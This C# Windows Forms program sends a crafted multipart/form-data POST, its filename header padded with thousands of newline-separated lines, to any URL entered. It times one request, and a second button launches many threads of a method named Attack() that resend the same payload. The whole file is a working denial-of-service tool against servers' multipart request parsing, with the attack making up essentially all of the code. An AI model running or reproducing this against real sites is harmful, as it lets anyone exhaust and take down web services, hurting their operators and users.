using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
namespace WindowsFormsApplication1
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string s = HttpPostData().ToString();
            s = "响应时间：" + s;
            MessageBox.Show(s);
        }
        private double HttpPostData()
        {
            string url=this.textBox1.Text;
            int timeOut = 1000000, lcount = int.Parse(textBox2.Text);
            string responseContent;
            string fileKeyName = "file";
            string filePath = "58.jpg";
            
            var memStream = new MemoryStream();
            var webRequest = (HttpWebRequest)WebRequest.Create(url);
            // 边界符
            var boundary = "---------------" + DateTime.Now.Ticks.ToString("x");
            // 边界符
            var beginBoundary = Encoding.ASCII.GetBytes("--" + boundary + "\r\n");
           
            // 最后的结束符
            var endBoundary = Encoding.ASCII.GetBytes("--" + boundary + "--\r\n");

            // 设置属性
            webRequest.Method = "POST";
            webRequest.Timeout = timeOut;
            webRequest.ContentType = "multipart/form-data; boundary=" + boundary;

            // 写入文件
            const string filePartHeader =
                "Content-Disposition: form-data; name=\"{0}\"; filename=\"s";
            var header = string.Format(filePartHeader, fileKeyName);
            var headerbytes = Encoding.UTF8.GetBytes(header);

            memStream.Write(beginBoundary, 0, beginBoundary.Length);
            memStream.Write(headerbytes, 0, headerbytes.Length);

            var buffer = new byte[2];
            buffer = Encoding.UTF8.GetBytes("a\n");
            int bytesRead=2; // =0

            for (int i = 0; i < lcount;i++ )
                memStream.Write(buffer, 0, bytesRead);
            var bb = "\"\nContent-Type: application/octet-stream\r\n\r\ndatadata\r\n";
            bb += boundary;
            bb += "--";
            var body = new byte[1024];
            body=Encoding.UTF8.GetBytes(bb);
            
            memStream.Write(body, 0, Encoding.UTF8.GetByteCount(bb));

            // 写入最后的结束边界符
            memStream.Write(endBoundary, 0, endBoundary.Length);

            webRequest.ContentLength = memStream.Length;

            var requestStream = webRequest.GetRequestStream();

            memStream.Position = 0;
            var tempBuffer = new byte[memStream.Length];
            memStream.Read(tempBuffer, 0, tempBuffer.Length);
            memStream.Close();

            requestStream.Write(tempBuffer, 0, tempBuffer.Length);
            requestStream.Close();
            DateTime d = DateTime.Now;
            var httpWebResponse = (HttpWebResponse)webRequest.GetResponse();

            using (var httpStreamReader = new StreamReader(httpWebResponse.GetResponseStream(),
                                                            Encoding.GetEncoding("utf-8")))
            {
                responseContent = httpStreamReader.ReadToEnd();
            }

           
            httpWebResponse.Close();
            webRequest.Abort();
            
            return (DateTime.Now-d).TotalSeconds;
        }
        private void Attack()
        {
            string url = this.textBox1.Text;
            int timeOut = 1000000, lcount = int.Parse(textBox2.Text);
            string responseContent;
            string fileKeyName = "file";
            string filePath = "58.jpg";

            var memStream = new MemoryStream();
            var webRequest = (HttpWebRequest)WebRequest.Create(url);
            // 边界符
            var boundary = "---------------" + DateTime.Now.Ticks.ToString("x");
            // 边界符
            var beginBoundary = Encoding.ASCII.GetBytes("--" + boundary + "\r\n");

            // 最后的结束符
            var endBoundary = Encoding.ASCII.GetBytes("--" + boundary + "--\r\n");

            // 设置属性
            webRequest.Method = "POST";
            webRequest.Timeout = timeOut;
            webRequest.ContentType = "multipart/form-data; boundary=" + boundary;

            // 写入文件
            const string filePartHeader =
                "Content-Disposition: form-data; name=\"{0}\"; filename=\"s";
            var header = string.Format(filePartHeader, fileKeyName);
            var headerbytes = Encoding.UTF8.GetBytes(header);

            memStream.Write(beginBoundary, 0, beginBoundary.Length);
            memStream.Write(headerbytes, 0, headerbytes.Length);

            var buffer = new byte[2];
            buffer = Encoding.UTF8.GetBytes("a\n");
            int bytesRead = 2; // =0

            for (int i = 0; i < lcount; i++)
                memStream.Write(buffer, 0, bytesRead);
            var bb = "\"\nContent-Type: application/octet-stream\r\n\r\ndatadata\r\n";
            bb += boundary;
            bb += "--";
            var body = new byte[1024];
            body = Encoding.UTF8.GetBytes(bb);

            memStream.Write(body, 0, Encoding.UTF8.GetByteCount(bb));

            // 写入最后的结束边界符
            memStream.Write(endBoundary, 0, endBoundary.Length);

            webRequest.ContentLength = memStream.Length;

            var requestStream = webRequest.GetRequestStream();

            memStream.Position = 0;
            var tempBuffer = new byte[memStream.Length];
            memStream.Read(tempBuffer, 0, tempBuffer.Length);
            memStream.Close();

            requestStream.Write(tempBuffer, 0, tempBuffer.Length);
            requestStream.Close();
            DateTime d = DateTime.Now;
            var httpWebResponse = (HttpWebResponse)webRequest.GetResponse();

            using (var httpStreamReader = new StreamReader(httpWebResponse.GetResponseStream(),
                                                            Encoding.GetEncoding("utf-8")))
            {
                responseContent = httpStreamReader.ReadToEnd();
            }


            httpWebResponse.Close();
            webRequest.Abort();

        }
        private void button2_Click(object sender, EventArgs e)
        {            
            int n = int.Parse(textBox3.Text); 
            for(int i=0;i<n;i++)
            {
                new Thread(Attack).Start();
            }
        }
    }
}
